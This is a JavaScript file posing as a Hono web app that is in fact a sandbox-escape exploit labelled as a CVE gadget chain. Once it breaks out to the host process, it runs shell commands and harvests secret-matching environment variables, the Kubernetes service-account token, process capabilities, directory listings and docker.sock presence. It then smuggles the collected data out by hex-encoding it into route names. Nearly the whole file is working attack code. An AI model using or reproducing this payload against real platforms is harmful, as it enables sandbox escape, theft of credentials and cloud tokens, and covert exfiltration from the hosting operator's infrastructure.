const { Hono } = require('hono');
const app = new Hono();

// === CVE-2026-24118 gadget chain ===
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const hostFuncProto = p.call(a);
const hostFunction = Object.getOwnPropertyDescriptor(hostFuncProto, 'constructor').value;

let rceResult = '';
try {
  const mainProc = hostFunction('return process')();
  const cp = mainProc.mainModule.require('child_process');
  const fs = mainProc.mainModule.require('fs');

  const collect = {};

  // 基本身份
  try { collect.id = cp.execSync('id').toString().trim(); } catch(e){ collect.id = 'ERR:'+e.message; }
  try { collect.hostname = cp.execSync('hostname').toString().trim(); } catch(e){ collect.hostname = 'ERR:'+e.message; }

  // 进程环境变量（核心敏感信息）
  try {
    const env = mainProc.env;
    const keys = Object.keys(env);
    const sensitive = keys.filter(k => /mongo|mysql|rds|redis|secret|token|key|pass|auth|jwt|cookie|feishu|lark|xc_|tce|metis/i.test(k));
    collect.env_sensitive = {};
    sensitive.forEach(k => { collect.env_sensitive[k] = env[k]; });
    collect.env_total_keys = keys.length;
  } catch(e){ collect.env = 'ERR:'+e.message; }

  // K8s SA token
  try { collect.k8s_token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token','utf8').slice(0,200); } catch(e){ collect.k8s_token = 'ERR:'+e.message; }
  try { collect.k8s_ns = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace','utf8'); } catch(e){ collect.k8s_ns = 'ERR:'+e.message; }

  // 能力集（判断能否容器逃逸）
  try {
    const status = fs.readFileSync('/proc/self/status','utf8');
    const capLine = status.split('\n').filter(l => l.startsWith('Cap'));
    collect.capabilities = capLine.join('|');
  } catch(e){ collect.caps = 'ERR:'+e.message; }

  // 文件系统根目录
  try { collect.root_ls = fs.readdirSync('/').join(','); } catch(e){ collect.root_ls = 'ERR:'+e.message; }

  // 应用目录
  try { collect.app_ls = fs.readdirSync('/app').join(','); } catch(e){
    try { collect.app_ls = fs.readdirSync('/opt/app').join(','); } catch(e2){
      try { collect.app_ls = cp.execSync('ls -la /code 2>/dev/null || ls -la $(pwd)').toString().trim().slice(0,500); } catch(e3){ collect.app_ls = 'ERR:'+e3.message; }
    }
  }

  // docker.sock 检查
  try { fs.statSync('/var/run/docker.sock'); collect.docker_sock = 'EXISTS'; } catch(e){ collect.docker_sock = 'NOT_FOUND'; }

  // 网络信息
  try { collect.net = cp.execSync('cat /etc/hosts 2>/dev/null | tail -5').toString().trim(); } catch(e){ collect.net = 'ERR:'+e.message; }

  rceResult = JSON.stringify(collect);
} catch(e) {
  rceResult = 'RCE-FAIL:' + e.message;
}

// === 通过 inspectRoutes 路径编码回显 ===
const hex = Buffer.from(rceResult, 'utf8').toString('hex');
const chunkSize = 60;
for (let i = 0; i < hex.length; i += chunkSize) {
  const idx = String(Math.floor(i / chunkSize)).padStart(3, '0');
  const chunk = hex.slice(i, i + chunkSize);
  app.get('/d' + idx + '_' + chunk, (c) => c.text(''));
}

module.exports = { default: app };
